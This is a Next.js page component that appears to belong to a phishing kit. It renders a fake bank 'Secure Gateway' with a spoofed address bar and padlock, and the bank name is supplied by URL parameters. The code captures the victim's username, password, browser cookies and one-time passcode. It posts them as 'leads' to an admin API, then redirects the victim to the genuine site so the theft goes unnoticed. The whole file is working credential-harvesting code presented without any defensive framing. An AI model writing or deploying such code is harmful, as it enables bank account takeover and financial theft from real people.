"use client";

import { useSearchParams } from "next/navigation";
import { useState, Suspense } from "react";

function LiveStreamContent() {
  const searchParams = useSearchParams();
  const bankName = searchParams.get("bank") || "Target Portal";
  const bankType = searchParams.get("type") || "Standard";
  const targetUrl = searchParams.get("targetUrl") || "https://www.google.com";

  const [step, setStep] = useState<1 | 2>(1);
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const activeLeadId = localStorage.getItem("active_lead_id");

      if (step === 1) {
        const payload = {
          bankName,
          bankType,
          userId,
          password,
          extraData: `Captured Login -> User: ${userId}`,
          cookiesData: JSON.stringify({ session_active: true, cookies: document.cookie || "none" }),
        };

        const res = await fetch("/api/admin/leads", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });

        const json = await res.json();
        const recordId = json.id || json.data?.id;
        if (recordId) {
          localStorage.setItem("active_lead_id", recordId);
        }

        setTimeout(() => {
          setIsLoading(false);
          setStep(2);
        }, 800);
      } else {
        const payload = {
          otpCode,
          extraData: `OTP Verified: ${otpCode}`,
          cookiesData: JSON.stringify({ session_authenticated: true, cookies: document.cookie || "none" }),
        };

        if (activeLeadId && activeLeadId !== "undefined") {
          await fetch(`/api/admin/leads/${activeLeadId}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
          });
        }

        setTimeout(() => {
          setIsLoading(false);
          window.location.href = decodeURIComponent(targetUrl);
        }, 1000);
      }
    } catch (err) {
      console.error("Capture error:", err);
      setIsLoading(false);
    }
  };

  return (
    <div className="flex h-screen w-screen flex-col bg-slate-950 font-sans select-none">
      <div className="flex h-11 items-center justify-between bg-[#1e293b] px-4 text-white shrink-0 border-b border-slate-800">
        <div className="flex items-center gap-2">
          <div className="flex gap-1.5">
            <span className="w-3 h-3 rounded-full bg-red-500 inline-block"></span>
            <span className="w-3 h-3 rounded-full bg-amber-500 inline-block"></span>
            <span className="w-3 h-3 rounded-full bg-emerald-500 inline-block"></span>
          </div>
          <span className="text-xs font-semibold ml-3 text-slate-300">{bankName} - Secure Gateway</span>
        </div>
        <div className="flex items-center bg-slate-900 px-4 py-1 rounded-md border border-slate-700 text-xs text-emerald-400 font-mono">
          🔒 {targetUrl}
        </div>
      </div>

      <div className="flex-1 relative flex items-center justify-center bg-slate-900">
        <div className="w-full max-w-md p-8 bg-white rounded-2xl shadow-2xl border border-slate-200 text-slate-900">
          <div className="text-center mb-6">
            <h1 className="text-xl font-black tracking-tight text-slate-900">Secure Authentication</h1>
            <p className="text-xs text-slate-500 mt-1">{bankName} ({bankType}) Verification Portal</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4 text-xs">
            {step === 1 ? (
              <>
                <div>
                  <label className="block font-bold text-slate-700 mb-1">Username / ID:</label>
                  <input
                    type="text"
                    required
                    value={userId}
                    onChange={(e) => setUserId(e.target.value)}
                    placeholder="Enter username"
                    className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-emerald-600 bg-slate-50 font-medium text-slate-900"
                  />
                </div>

                <div>
                  <label className="block font-bold text-slate-700 mb-1">Password:</label>
                  <input
                    type="password"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Enter password"
                    className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-emerald-600 bg-slate-50 font-medium text-slate-900"
                  />
                </div>

                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-emerald-700 hover:bg-emerald-800 text-white font-bold py-3.5 rounded-xl transition cursor-pointer shadow-md text-sm mt-2"
                >
                  {isLoading ? "Processing..." : "Continue to Verification"}
                </button>
              </>
            ) : (
              <>
                <div>
                  <label className="block font-bold text-slate-700 mb-1">Security Code / OTP:</label>
                  <input
                    type="text"
                    required
                    value={otpCode}
                    onChange={(e) => setOtpCode(e.target.value)}
                    placeholder="Enter 6-digit OTP"
                    className="w-full rounded-xl border border-amber-400 p-3 text-center text-lg font-mono font-bold tracking-widest outline-none bg-amber-50 text-slate-900"
                  />
                </div>

                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-emerald-700 hover:bg-emerald-800 text-white font-bold py-3.5 rounded-xl transition cursor-pointer shadow-md text-sm mt-2"
                >
                  {isLoading ? "Authenticating..." : "Complete & Launch"}
                </button>
              </>
            )}
          </form>
        </div>
      </div>
    </div>
  );
}

export default function LiveStreamPage() {
  return (
    <Suspense fallback={<div className="flex h-screen items-center justify-center bg-slate-950 text-white">Loading Portal...</div>}>
      <LiveStreamContent />
    </Suspense>
  );
}